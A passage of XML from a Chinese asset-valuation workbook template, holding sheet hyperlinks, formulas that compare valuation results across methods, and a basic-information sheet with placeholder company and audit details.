    <hyperlink ref="C39" location="'3-10合同资产'!A1" display="3-10合同资产"/>
    <hyperlink ref="C40" location="'3-11持有待售资产'!A1" display="3-11持有待售资产"/>
    <hyperlink ref="C41" location="'3-12一年到期非流动资产'!A1" display="3-12一年到期非流动资产"/>
    <hyperlink ref="C42" location="'3-13其他流动资产'!A1" display="3-13其他流动资产"/>
    <hyperlink ref="C43" location="'4-非流动资产汇总'!A1" display="4-非流动资产汇总"/>
    <hyperlink ref="C44" location="'4-1债权投资'!A1" display="4-1债权投资"/>
    <hyperlink ref="C45" location="'4-2其他债权投资'!A1" display="4-2其他债权投资"/>
    <hyperlink ref="C46" location="'4-3长期应收'!A1" display="4-3长期应收"/>
    <hyperlink ref="C47" location="'4-4股权投资'!A1" display="4-4股权投资"/>
    <hyperlink ref="C48" location="'4-5其他权益工具投资'!A1" display="4-5其他权益工具投资"/>
    <hyperlink ref="C49" location="'4-6其他非流动金融资产'!A1" display="4-6其他非流动金融资产"/>
    <hyperlink ref="C50" location="'4-6-1-股票'!A1" display="4-6-1-股票"/>
    <hyperlink ref="C51" location="'4-6-2-债券'!A1" display="4-6-2-债券"/>
    <hyperlink ref="C52" location="'4-6-3-基金'!A1" display="4-6-3-基金"/>
    <hyperlink ref="C53" location="'4-7投资性房地产汇总'!A1" display="4-7投资性房地产汇总"/>
    <hyperlink ref="C54" location="'4-7-1投资性房地产'!A1" display="4-7-1投资性房地产"/>
    <hyperlink ref="C55" location="'4-7-2投资性房地产'!A1" display="4-7-2投资性房地产"/>
    <hyperlink ref="C56" location="'4-7-3投资性地产'!A1" display="4-7-3投资性地产"/>
    <hyperlink ref="C57" location="'4-7-4投资性地产'!A1" display="4-7-4投资性地产"/>
    <hyperlink ref="C58" location="'4-8固定资产汇总'!A1" display="4-8固定资产汇总"/>
    <hyperlink ref="C59" location="'4-8-1房屋建筑物'!A1" display="4-8-1房屋建筑物"/>
    <hyperlink ref="C60" location="'4-8-2构筑物'!A1" display="4-8-2构筑物"/>
    <hyperlink ref="C61" location="'4-8-3管道沟槽'!A1" display="4-8-3管道沟槽"/>
    <hyperlink ref="C62" location="'4-8-4机器设备'!A1" display="4-8-4机器设备"/>
    <hyperlink ref="C63" location="'4-8-5车辆'!A1" display="4-8-5车辆"/>
    <hyperlink ref="C64" location="'4-8-6电子设备'!A1" display="4-8-6电子设备"/>
    <hyperlink ref="C65" location="'4-8-7固定资产清理'!A1" display="4-8-7固定资产清理"/>
    <hyperlink ref="C66" location="'4-9在建工程汇总'!A1" display="4-9在建工程汇总"/>
    <hyperlink ref="C67" location="'4-9-1在建（土建）'!A1" display="4-9-1在建（土建）"/>
    <hyperlink ref="C68" location="'4-9-2在建（设备）'!A1" display="4-9-2在建（设备）"/>
    <hyperlink ref="C69" location="'4-9-3在建工程（工程物资）'!A1" display="4-9-3在建工程（工程物资）"/>
    <hyperlink ref="C70" location="'4-10生产性生物资产'!A1" display="4-10生产性生物资产"/>
    <hyperlink ref="C71" location="'4-11油气资产'!A1" display="4-11油气资产"/>
    <hyperlink ref="C72" location="'4-12使用权资产'!A1" display="4-12使用权资产"/>
    <hyperlink ref="C73" location="'4-13无形资产汇总'!A1" display="4-13无形资产汇总"/>
    <hyperlink ref="C74" location="'4-13-1无形-土地'!A1" display="4-13-1无形-土地"/>
    <hyperlink ref="C75" location="'4-13-2无形-矿业权'!A1" display="4-13-2无形-矿业权"/>
    <hyperlink ref="C76" location="'4-13-3无形-其他'!A1" display="4-13-3无形-其他"/>
    <hyperlink ref="C77" location="'4-14开发支出'!A1" display="4-14开发支出"/>
    <hyperlink ref="C78" location="'4-15商誉'!A1" display="4-15商誉"/>
    <hyperlink ref="C79" location="'4-16长期待摊费用'!A1" display="4-16长期待摊费用"/>
    <hyperlink ref="C80" location="'4-17递延所得税资产'!A1" display="4-17递延所得税资产"/>
    <hyperlink ref="C81" location="'4-18其他非流动资产'!A1" display="4-18其他非流动资产"/>
    <hyperlink ref="C82" location="'5-流动负债汇总'!A1" display="5-流动负债汇总"/>
    <hyperlink ref="C83" location="'5-1短期借款'!A1" display="5-1短期借款"/>
    <hyperlink ref="C84" location="'5-2交易性金融负债'!A1" display="5-2交易性金融负债"/>
    <hyperlink ref="C85" location="'5-3衍生金融负债'!A1" display="5-3衍生金融负债"/>
    <hyperlink ref="C86" location="'5-4应付票据'!A1" display="5-4应付票据"/>
    <hyperlink ref="C87" location="'5-5应付账款'!A1" display="5-5应付账款"/>
    <hyperlink ref="C88" location="'5-6预收款项'!A1" display="5-6预收款项"/>
    <hyperlink ref="C89" location="'5-7合同负债'!A1" display="5-7合同负债"/>
    <hyperlink ref="C90" location="'5-8职工薪酬'!A1" display="5-8职工薪酬"/>
    <hyperlink ref="C91" location="'5-9应交税费'!A1" display="5-9应交税费"/>
    <hyperlink ref="C92" location="'5-10其他应付款汇总表'!A1" display="5-10其他应付款汇总表"/>
    <hyperlink ref="C93" location="'5-10-1应付利息'!A1" display="5-10-1应付利息"/>
    <hyperlink ref="C94" location="'5-10-2应付股利（利润）'!A1" display="5-10-2应付股利（利润）"/>
    <hyperlink ref="C95" location="'5-10-3其他应付款'!A1" display="5-10-3其他应付款"/>
    <hyperlink ref="C96" location="'5-11持有待售负债'!A1" display="5-11持有待售负债"/>
    <hyperlink ref="C97" location="'5-12一年到期非流动负债'!A1" display="5-12一年到期非流动负债"/>
    <hyperlink ref="C98" location="'5-13其他流动负债'!A1" display="5-13其他流动负债"/>
    <hyperlink ref="C99" location="'6-非流动负债汇总'!A1" display="6-非流动负债汇总"/>
    <hyperlink ref="C100" location="'6-1长期借款'!A1" display="6-1长期借款"/>
    <hyperlink ref="C101" location="'6-2应付债券'!A1" display="6-2应付债券"/>
    <hyperlink ref="C102" location="'6-3租赁负债'!A1" display="6-3租赁负债"/>
    <hyperlink ref="C103" location="'6-4长期应付款'!A1" display="6-4长期应付款"/>
    <hyperlink ref="C104" location="'6-5长期应付职工薪酬'!A1" display="6-5长期应付职工薪酬"/>
    <hyperlink ref="C105" location="'6-6预计负债'!A1" display="6-6预计负债"/>
    <hyperlink ref="C106" location="'6-7递延收益'!A1" display="6-7递延收益"/>
    <hyperlink ref="C107" location="'6-8递延所得税负债'!A1" display="6-8递延所得税负债"/>
    <hyperlink ref="C108" location="'6-9其他非流动负债'!A1" display="6-9其他非流动负债"/>
  </hyperlinks>
  <pageMargins left="0.751388888888889" right="0.751388888888889" top="1" bottom="0.972222222222222" header="0.5" footer="0.597916666666667"/>
  <pageSetup orientation="portrait" paperSize="9" scale="77"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet5.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet5">
    <tabColor rgb="FFFF0000"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A2:J28"/>
  <sheetViews>
    <sheetView topLeftCell="C7" workbookViewId="0">
      <selection activeCell="H24" sqref="H24"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="21" customHeight="1"/>
  <cols>
    <col hidden="1" width="2.33333333333333" customWidth="1" style="415" min="1" max="1"/>
    <col hidden="1" width="9" customWidth="1" style="415" min="2" max="2"/>
    <col width="28.8333333333333" customWidth="1" style="415" min="3" max="3"/>
    <col width="21.1666666666667" customWidth="1" style="415" min="4" max="4"/>
    <col width="20.6666666666667" customWidth="1" style="415" min="5" max="5"/>
    <col width="17.5" customWidth="1" style="415" min="6" max="7"/>
    <col width="38.1666666666667" customWidth="1" style="415" min="8" max="8"/>
    <col hidden="1" width="14.8333333333333" customWidth="1" style="415" min="9" max="9"/>
    <col hidden="1" width="22.1666666666667" customWidth="1" style="415" min="10" max="10"/>
  </cols>
  <sheetData>
    <row r="2" s="415">
      <c r="D2" s="436" t="inlineStr">
        <is>
          <t>请输入</t>
        </is>
      </c>
    </row>
    <row r="3" s="415">
      <c r="G3" s="438" t="n"/>
    </row>
    <row r="4" ht="25" customHeight="1" s="415">
      <c r="C4" s="439" t="inlineStr">
        <is>
          <t>合并报表归属于母公司的净资产</t>
        </is>
      </c>
      <c r="D4" s="537" t="n"/>
      <c r="E4" s="441" t="inlineStr">
        <is>
          <t>万元</t>
        </is>
      </c>
    </row>
    <row r="5" s="415">
      <c r="C5" s="439" t="inlineStr">
        <is>
          <t>收益法评估结果</t>
        </is>
      </c>
      <c r="D5" s="537" t="n"/>
      <c r="E5" s="441" t="inlineStr">
        <is>
          <t>万元</t>
        </is>
      </c>
    </row>
    <row r="6" s="415">
      <c r="C6" s="442" t="inlineStr">
        <is>
          <t>市场法评估结果</t>
        </is>
      </c>
      <c r="D6" s="537" t="n"/>
      <c r="E6" s="441" t="inlineStr">
        <is>
          <t>万元</t>
        </is>
      </c>
    </row>
    <row r="7" s="415">
      <c r="B7" s="428" t="n"/>
      <c r="C7" s="442" t="inlineStr">
        <is>
          <t>结论方法</t>
        </is>
      </c>
      <c r="D7" s="538" t="inlineStr">
        <is>
          <t>收益法</t>
        </is>
      </c>
    </row>
    <row r="8" s="415">
      <c r="C8" s="442" t="inlineStr">
        <is>
          <t>未作为结论方法</t>
        </is>
      </c>
      <c r="D8" s="538" t="inlineStr">
        <is>
          <t>资产基础法</t>
        </is>
      </c>
      <c r="E8" s="441" t="n"/>
    </row>
    <row r="9" s="415">
      <c r="C9" s="444" t="inlineStr">
        <is>
          <t>评估结果及增减值率</t>
        </is>
      </c>
      <c r="D9" s="445" t="n"/>
      <c r="E9" s="445" t="n"/>
      <c r="F9" s="444" t="n"/>
      <c r="G9" s="445" t="n"/>
      <c r="H9" s="445" t="n"/>
      <c r="I9" s="445" t="n"/>
      <c r="J9" s="444" t="n"/>
    </row>
    <row r="10" s="415">
      <c r="C10" s="446" t="inlineStr">
        <is>
          <t>项目</t>
        </is>
      </c>
      <c r="D10" s="446" t="inlineStr">
        <is>
          <t>账面价值(万元）</t>
        </is>
      </c>
      <c r="E10" s="446" t="inlineStr">
        <is>
          <t>评估结果(万元）</t>
        </is>
      </c>
      <c r="F10" s="446" t="inlineStr">
        <is>
          <t>增值额(万元）</t>
        </is>
      </c>
      <c r="G10" s="446" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="H10" s="446" t="inlineStr">
        <is>
          <t>评估值结果大写</t>
        </is>
      </c>
      <c r="I10" s="446" t="inlineStr">
        <is>
          <t>评估方法名称</t>
        </is>
      </c>
      <c r="J10" s="446" t="inlineStr">
        <is>
          <t>增值/减值</t>
        </is>
      </c>
    </row>
    <row r="11" s="415">
      <c r="C11" s="446" t="n"/>
      <c r="D11" s="539" t="inlineStr">
        <is>
          <t>A</t>
        </is>
      </c>
      <c r="E11" s="539" t="inlineStr">
        <is>
          <t>B</t>
        </is>
      </c>
      <c r="F11" s="539" t="inlineStr">
        <is>
          <t>C=B-A</t>
        </is>
      </c>
      <c r="G11" s="539" t="inlineStr">
        <is>
          <t>D=C/A×100</t>
        </is>
      </c>
      <c r="H11" s="446" t="n"/>
      <c r="I11" s="446" t="n"/>
      <c r="J11" s="446" t="n"/>
    </row>
    <row r="12" s="415">
      <c r="A12" t="n">
        <v>1</v>
      </c>
      <c r="B12" s="428" t="inlineStr">
        <is>
          <t>资产结果</t>
        </is>
      </c>
      <c r="C12" s="448" t="inlineStr">
        <is>
          <t>资产基础法</t>
        </is>
      </c>
      <c r="D12" s="540">
        <f>'1-汇总表'!E31</f>
        <v/>
      </c>
      <c r="E12" s="540">
        <f>'1-汇总表'!F31</f>
        <v/>
      </c>
      <c r="F12" s="540">
        <f>E12-D12</f>
        <v/>
      </c>
      <c r="G12" s="540">
        <f>IF(D12=0,"",ROUND(F12/D12*100,2))</f>
        <v/>
      </c>
      <c r="H12" s="541">
        <f>IF(E12&lt;0,"负"&amp;NUMBERSTRING(ABS(E12)*10000,2),NUMBERSTRING(ABS(E12)*10000,2))</f>
        <v/>
      </c>
      <c r="I12" s="541">
        <f>C12</f>
        <v/>
      </c>
      <c r="J12" s="451">
        <f>IF(F12&gt;0.001,"评估增值",IF(F12&lt;-0.001,"评估减值","无评估增减值"))</f>
        <v/>
      </c>
    </row>
    <row r="13" s="415">
      <c r="A13" t="n">
        <v>2</v>
      </c>
      <c r="B13" s="428" t="inlineStr">
        <is>
          <t>收益结果</t>
        </is>
      </c>
      <c r="C13" s="452" t="inlineStr">
        <is>
          <t>收益法</t>
        </is>
      </c>
      <c r="D13" s="540">
        <f>$D$12</f>
        <v/>
      </c>
      <c r="E13" s="540">
        <f>D5</f>
        <v/>
      </c>
      <c r="F13" s="540">
        <f>E13-D13</f>
        <v/>
      </c>
      <c r="G13" s="540">
        <f>IF(D13=0,"",ROUND(F13/D13*100,2))</f>
        <v/>
      </c>
      <c r="H13" s="541">
        <f>IF(E13&lt;0,"负"&amp;NUMBERSTRING(ABS(E13)*10000,2),NUMBERSTRING(ABS(E13)*10000,2))</f>
        <v/>
      </c>
      <c r="I13" s="541">
        <f>C13</f>
        <v/>
      </c>
      <c r="J13" s="451">
        <f>IF(F13&gt;0.001,"评估增值",IF(F13&lt;-0.001,"评估减值","无评估增减值"))</f>
        <v/>
      </c>
    </row>
    <row r="14" s="415">
      <c r="A14" t="n">
        <v>3</v>
      </c>
      <c r="B14" s="428" t="inlineStr">
        <is>
          <t>市场结果</t>
        </is>
      </c>
      <c r="C14" s="448" t="inlineStr">
        <is>
          <t>市场法</t>
        </is>
      </c>
      <c r="D14" s="540">
        <f>$D$12</f>
        <v/>
      </c>
      <c r="E14" s="540">
        <f>D6</f>
        <v/>
      </c>
      <c r="F14" s="540">
        <f>E14-D14</f>
        <v/>
      </c>
      <c r="G14" s="540">
        <f>IF(D14=0,"",ROUND(F14/D14*100,2))</f>
        <v/>
      </c>
      <c r="H14" s="541">
        <f>IF(E14&lt;0,"负"&amp;NUMBERSTRING(ABS(E14)*10000,2),NUMBERSTRING(ABS(E14)*10000,2))</f>
        <v/>
      </c>
      <c r="I14" s="541">
        <f>C14</f>
        <v/>
      </c>
      <c r="J14" s="451">
        <f>IF(F14&gt;0.001,"评估增值",IF(F14&lt;-0.001,"评估减值","评估无增减值"))</f>
        <v/>
      </c>
    </row>
    <row r="15" s="415">
      <c r="A15" t="n">
        <v>4</v>
      </c>
      <c r="B15" s="428" t="inlineStr">
        <is>
          <t>成本结果</t>
        </is>
      </c>
      <c r="C15" s="448" t="inlineStr">
        <is>
          <t>成本法</t>
        </is>
      </c>
      <c r="D15" s="540">
        <f>$D$12</f>
        <v/>
      </c>
      <c r="E15" s="540">
        <f>E12</f>
        <v/>
      </c>
      <c r="F15" s="540">
        <f>E15-D15</f>
        <v/>
      </c>
      <c r="G15" s="540">
        <f>IF(D15=0,"",ROUND(F15/D15*100,2))</f>
        <v/>
      </c>
      <c r="H15" s="541">
        <f>IF(E15&lt;0,"负"&amp;NUMBERSTRING(ABS(E15)*10000,2),NUMBERSTRING(ABS(E15)*10000,2))</f>
        <v/>
      </c>
      <c r="I15" s="541">
        <f>C15</f>
        <v/>
      </c>
      <c r="J15" s="451">
        <f>IF(F15&gt;0.001,"评估增值",IF(F15&lt;-0.001,"评估减值","评估无增减值"))</f>
        <v/>
      </c>
    </row>
    <row r="16" s="415">
      <c r="A16" t="n">
        <v>5</v>
      </c>
      <c r="B16" s="428" t="inlineStr">
        <is>
          <t>不适用</t>
        </is>
      </c>
      <c r="C16" s="448" t="inlineStr">
        <is>
          <t>不适用</t>
        </is>
      </c>
      <c r="D16" s="540" t="n"/>
      <c r="E16" s="540" t="n"/>
      <c r="F16" s="540" t="n"/>
      <c r="G16" s="540" t="n"/>
      <c r="H16" s="541" t="n"/>
      <c r="I16" s="541">
        <f>C16</f>
        <v/>
      </c>
      <c r="J16" s="451" t="n"/>
    </row>
    <row r="17" s="415">
      <c r="A17" t="n">
        <v>6</v>
      </c>
      <c r="B17" s="428" t="inlineStr">
        <is>
          <t>最终结果</t>
        </is>
      </c>
      <c r="C17" s="448" t="inlineStr">
        <is>
          <t>最终结果</t>
        </is>
      </c>
      <c r="D17" s="540">
        <f>INDEX(D12:D16,MATCH(D7,C12:C16,0))</f>
        <v/>
      </c>
      <c r="E17" s="540">
        <f>INDEX(E12:E16,MATCH(D7,C12:C16,0))</f>
        <v/>
      </c>
      <c r="F17" s="540">
        <f>E17-D17</f>
        <v/>
      </c>
      <c r="G17" s="540">
        <f>IF(D17=0,"",ROUND(F17/D17*100,2))</f>
        <v/>
      </c>
      <c r="H17" s="541">
        <f>IF(E17&lt;0,"负"&amp;NUMBERSTRING(ABS(E17)*10000,2),NUMBERSTRING(ABS(E17)*10000,2))</f>
        <v/>
      </c>
      <c r="I17" s="541">
        <f>D7</f>
        <v/>
      </c>
      <c r="J17" s="451">
        <f>IF(F17&gt;0.001,"评估增值",IF(F17&lt;-0.001,"评估减值","评估无增减值"))</f>
        <v/>
      </c>
    </row>
    <row r="18" s="415">
      <c r="A18" t="n">
        <v>7</v>
      </c>
      <c r="B18" s="428" t="inlineStr">
        <is>
          <t>未用结果</t>
        </is>
      </c>
      <c r="C18" s="448" t="inlineStr">
        <is>
          <t>未采用结果</t>
        </is>
      </c>
      <c r="D18" s="540">
        <f>INDEX(D12:D16,MATCH(D8,C12:C16,0))</f>
        <v/>
      </c>
      <c r="E18" s="540">
        <f>INDEX(E12:E16,MATCH(D8,C12:C16,0))</f>
        <v/>
      </c>
      <c r="F18" s="540">
        <f>E18-D18</f>
        <v/>
      </c>
      <c r="G18" s="540">
        <f>IF(D18=0,"",ROUND(F18/D18*100,2))</f>
        <v/>
      </c>
      <c r="H18" s="541">
        <f>IF(E18&lt;0,"负"&amp;NUMBERSTRING(ABS(E18)*10000,2),NUMBERSTRING(ABS(E18)*10000,2))</f>
        <v/>
      </c>
      <c r="I18" s="541">
        <f>D8</f>
        <v/>
      </c>
      <c r="J18" s="451">
        <f>IF(F18&gt;0.001,"评估增值",IF(F18&lt;-0.001,"评估减值","评估无增减值"))</f>
        <v/>
      </c>
    </row>
    <row r="19" s="415">
      <c r="A19" t="n">
        <v>8</v>
      </c>
      <c r="B19" s="428" t="inlineStr">
        <is>
          <t>合表增减</t>
        </is>
      </c>
      <c r="C19" s="448" t="inlineStr">
        <is>
          <t>与合并报表比较</t>
        </is>
      </c>
      <c r="D19" s="540">
        <f>D4</f>
        <v/>
      </c>
      <c r="E19" s="540">
        <f>E17</f>
        <v/>
      </c>
      <c r="F19" s="540">
        <f>E19-D19</f>
        <v/>
      </c>
      <c r="G19" s="540">
        <f>IF(D19=0,"",ROUND(F19/D19*100,2))</f>
        <v/>
      </c>
      <c r="H19" s="541">
        <f>IF(E19&lt;0,"负"&amp;NUMBERSTRING(ABS(E19)*10000,2),NUMBERSTRING(ABS(E19)*10000,2))</f>
        <v/>
      </c>
      <c r="I19" s="541">
        <f>D7</f>
        <v/>
      </c>
      <c r="J19" s="451">
        <f>IF(F19&gt;0.001,"评估增值",IF(F19&lt;-0.001,"评估减值","评估无增减值"))</f>
        <v/>
      </c>
    </row>
    <row r="21" s="415">
      <c r="C21" s="444" t="inlineStr">
        <is>
          <t>不同方法的对比结果</t>
        </is>
      </c>
      <c r="D21" s="445" t="n"/>
      <c r="E21" s="445" t="n"/>
    </row>
    <row r="22" s="415">
      <c r="C22" s="453" t="inlineStr">
        <is>
          <t>方法比较</t>
        </is>
      </c>
      <c r="D22" s="453">
        <f>C7</f>
        <v/>
      </c>
      <c r="E22" s="542">
        <f>C8</f>
        <v/>
      </c>
      <c r="F22" s="542" t="inlineStr">
        <is>
          <t>差异绝对值（万元）</t>
        </is>
      </c>
      <c r="G22" s="542" t="inlineStr">
        <is>
          <t>差异率%</t>
        </is>
      </c>
    </row>
    <row r="23" s="415">
      <c r="A23" t="n">
        <v>9</v>
      </c>
      <c r="B23" s="428" t="inlineStr">
        <is>
          <t>差异对比</t>
        </is>
      </c>
      <c r="C23" s="439" t="inlineStr">
        <is>
          <t>不同方法的对比</t>
        </is>
      </c>
      <c r="D23" s="543">
        <f>INDEX(E12:E16,MATCH(D7,C12:C16,0))</f>
        <v/>
      </c>
      <c r="E23" s="543">
        <f>INDEX(E12:E16,MATCH(D8,C12:C16,0))</f>
        <v/>
      </c>
      <c r="F23" s="543">
        <f>ABS(D23-E23)</f>
        <v/>
      </c>
      <c r="G23" s="544">
        <f>IF(E13=0,"",ROUND(F23/MAX(D23,E23)*100,2))</f>
        <v/>
      </c>
    </row>
    <row r="27" s="415">
      <c r="E27" s="535" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="E28" s="535" t="n"/>
    </row>
  </sheetData>
  <sheetProtection selectLockedCells="0" selectUnlockedCells="0" sheet="1" objects="1" insertRows="1" insertHyperlinks="0" autoFilter="0" scenarios="0" formatColumns="1" deleteColumns="1" insertColumns="1" pivotTables="1" deleteRows="1" formatCells="0" formatRows="1" sort="1"/>
  <conditionalFormatting sqref="C9:J9">
    <cfRule type="expression" priority="18" dxfId="1">
      <formula>_xlfn.ISFORMULA(C9)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="C4:D8">
    <cfRule type="expression" priority="4" dxfId="1">
      <formula>_xlfn.ISFORMULA(C4)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="C10:H10 C11 C12:H15 G27:J28 H11 I10:J15 K22:L22">
    <cfRule type="expression" priority="22" dxfId="1">
      <formula>_xlfn.ISFORMULA(C10)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="C16:J23">
    <cfRule type="expression" priority="1" dxfId="1">
      <formula>_xlfn.ISFORMULA(C16)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="C24:F28 G25:I26 J24:K26 K23:M23">
    <cfRule type="expression" priority="16" dxfId="1">
      <formula>_xlfn.ISFORMULA(C23)</formula>
    </cfRule>
  </conditionalFormatting>
  <dataValidations count="4">
    <dataValidation sqref="D5" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" promptTitle="收益法" prompt="请在此处输入：1. 收益法评估结果；2. 金额单位：万元；3. 小数点后保留两位"/>
    <dataValidation sqref="D6" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" promptTitle="市场法" prompt="请在此处输入：1. 市场法评估结果；2. 金额单位：万元；3. 小数点后保留两位"/>
    <dataValidation sqref="D7" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" type="list">
      <formula1>$C$12:$C$15</formula1>
    </dataValidation>
    <dataValidation sqref="D8" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" type="list">
      <formula1>$C$12:$C$16</formula1>
    </dataValidation>
  </dataValidations>
  <pageMargins left="0.751388888888889" right="0.751388888888889" top="1" bottom="0.972222222222222" header="0.5" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" scale="84"/>
  <headerFooter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2">
    <tabColor rgb="FFFF0000"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr/>
  </sheetPr>
  <dimension ref="A1:E36"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A2" zoomScaleNormal="90" workbookViewId="0">
      <selection activeCell="C18" sqref="C18"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="21" customHeight="1"/>
  <cols>
    <col width="31.3333333333333" customWidth="1" style="415" min="1" max="1"/>
    <col width="30.6666666666667" customWidth="1" style="415" min="2" max="2"/>
    <col width="21.8333333333333" customWidth="1" style="415" min="3" max="3"/>
    <col width="25.6666666666667" customWidth="1" style="415" min="4" max="4"/>
    <col width="22.8333333333333" customWidth="1" style="415" min="5" max="5"/>
  </cols>
  <sheetData>
    <row r="1" hidden="1" s="415">
      <c r="A1" t="inlineStr">
        <is>
          <t>TYPG-XT-ZPX-3.4.56</t>
        </is>
      </c>
    </row>
    <row r="4" customFormat="1" s="428">
      <c r="A4" s="545" t="n"/>
    </row>
    <row r="5" customFormat="1" s="428">
      <c r="A5" s="546" t="inlineStr">
        <is>
          <t>基本信息：</t>
        </is>
      </c>
    </row>
    <row r="6" customFormat="1" s="428">
      <c r="A6" s="431" t="inlineStr">
        <is>
          <t>被评估单位</t>
        </is>
      </c>
      <c r="B6" s="432" t="inlineStr">
        <is>
          <t>浙江ABC有限责任公司</t>
        </is>
      </c>
    </row>
    <row r="7" customFormat="1" s="428">
      <c r="A7" s="68" t="inlineStr">
        <is>
          <t>评估基准日</t>
        </is>
      </c>
      <c r="B7" s="536" t="n">
        <v>44926</v>
      </c>
    </row>
    <row r="8" s="415">
      <c r="A8" s="68" t="inlineStr">
        <is>
          <t>除“1-汇总表”金额单位</t>
        </is>
      </c>
      <c r="B8" s="432" t="inlineStr">
        <is>
          <t>人民币元</t>
        </is>
      </c>
    </row>
    <row r="9" s="415">
      <c r="A9" s="68" t="inlineStr">
        <is>
          <t>“1-汇总表”金额单位</t>
        </is>
      </c>
      <c r="B9" s="432" t="inlineStr">
        <is>
          <t>人民币万元</t>
        </is>
      </c>
    </row>
    <row r="10" ht="12" customHeight="1" s="415">
      <c r="A10" s="428" t="n"/>
      <c r="B10" s="482" t="n"/>
    </row>
    <row r="11" customFormat="1" s="428">
      <c r="A11" s="68" t="inlineStr">
        <is>
          <t>审计机构名称</t>
        </is>
      </c>
      <c r="B11" s="536" t="inlineStr">
        <is>
          <t>XX会计师事务所</t>
        </is>
      </c>
    </row>
    <row r="12" customFormat="1" s="428">
      <c r="A12" s="68" t="inlineStr">
        <is>
          <t>审计报告文号</t>
        </is>
      </c>
      <c r="B12" s="536" t="inlineStr">
        <is>
          <t>审〔2023〕XXX号</t>
        </is>
      </c>
    </row>
    <row r="13" customFormat="1" s="428">
      <c r="A13" s="68" t="inlineStr">
        <is>
          <t>审计报告意见类型</t>
        </is>
      </c>
      <c r="B13" s="536" t="inlineStr">
        <is>
          <t>标准的无保留意见</t>
        </is>
      </c>
    </row>
    <row r="14" customFormat="1" s="428">
      <c r="A14" s="68" t="inlineStr">
        <is>
          <t>审计报告名称</t>
        </is>
      </c>
      <c r="B14" s="536" t="inlineStr">
        <is>
          <t>XX公司审计报告</t>
        </is>
      </c>
    </row>
    <row r="15" customFormat="1" s="428">
      <c r="A15" s="68" t="inlineStr">
        <is>
          <t>审计报告出具日期</t>
        </is>
      </c>
      <c r="B15" s="536" t="n">
        <v>44949</v>
      </c>
    </row>
    <row r="16" s="415">
      <c r="A16" s="428" t="n"/>
      <c r="B16" s="482" t="n"/>
    </row>
    <row r="17" s="415">
      <c r="A17" s="428" t="n"/>
      <c r="B17" s="482" t="n"/>
    </row>
    <row r="18" s="415">
      <c r="A18" s="428" t="n"/>
      <c r="B18" s="482" t="n"/>
    </row>
    <row r="19" s="415">
      <c r="A19" s="428" t="n"/>
      <c r="B19" s="482" t="n"/>
    </row>
    <row r="20" s="415">
      <c r="A20" s="428" t="n"/>
      <c r="B20" s="482" t="n"/>
    </row>
    <row r="21" s="415">
      <c r="A21" s="428" t="n"/>
      <c r="B21" s="482" t="n"/>
    </row>
    <row r="22" s="415">
      <c r="A22" s="428" t="n"/>
      <c r="B22" s="482" t="n"/>
    </row>
    <row r="23" s="415">
      <c r="A23" s="428" t="n"/>
      <c r="B23" s="482" t="n"/>
    </row>
    <row r="24" s="415">
      <c r="E24" s="435" t="n"/>
    </row>
    <row r="25" s="415">
      <c r="A25" s="436" t="inlineStr">
        <is>
          <t>填表注意事项：</t>
        </is>
      </c>
    </row>
    <row r="26" s="415">
      <c r="A26" s="436" t="inlineStr">
        <is>
          <t>1.请注意粘帖明细表时，用选择性粘帖，否则单元格格式将被修改。</t>
        </is>
      </c>
    </row>
    <row r="27" s="415">
      <c r="A27" s="436" t="inlineStr">
        <is>
          <t>2.若增减行数，打印前请注意使表格满页。</t>
        </is>
      </c>
    </row>
    <row r="28" s="415">
      <c r="A28" s="435" t="inlineStr">
        <is>
          <t>3.打印前请增加页脚信息，页脚评估人员应包含两位签字评估师+其他参与操作人员。</t>
        </is>
      </c>
    </row>
    <row r="29" s="415">
      <c r="A29" s="435" t="inlineStr">
        <is>
          <t>4.用不到的表页，应隐藏，不能删除。</t>
        </is>
      </c>
    </row>
    <row r="30" s="415">
      <c r="A30" s="435" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="437" t="n"/>
    </row>
    <row r="32" s="415">
      <c r="A32" s="437" t="n"/>
    </row>
    <row r="33" s="415">
      <c r="A33" s="437" t="n"/>
    </row>
    <row r="34" s="415">
      <c r="A34" s="437" t="n"/>
    </row>
    <row r="35" s="415">
      <c r="A35" s="437" t="n"/>
    </row>
    <row r="36" s="415">
      <c r="A36" s="437" t="n"/>
    </row>
  </sheetData>
  <dataValidations count="3">
    <dataValidation sqref="A6" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" type="list">
      <formula1>"被评估单位,产权持有单位,标的公司"</formula1>
    </dataValidation>
    <dataValidation sqref="B7" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" type="date" operator="greaterThanOrEqual">
      <formula1>1</formula1>
    </dataValidation>
    <dataValidation sqref="B13" showDropDown="0" showInputMessage="1" showErrorMessage="1" allowBlank="1" type="list">
      <formula1>"标准的无保留意见,带强调事项段的无保留意见,保留意见,否定意见,无法表示意见"</formula1>
    </dataValidation>
  </dataValidations>
  <pageMargins left="0.751388888888889" right="0.751388888888889" top="1" bottom="0.972222222222222" header="0.5" footer="0.597222222222222"/>
  <pageSetup orientation="portrait" paperSize="9" scale="57" horizontalDpi="300" verticalDpi="300"/>
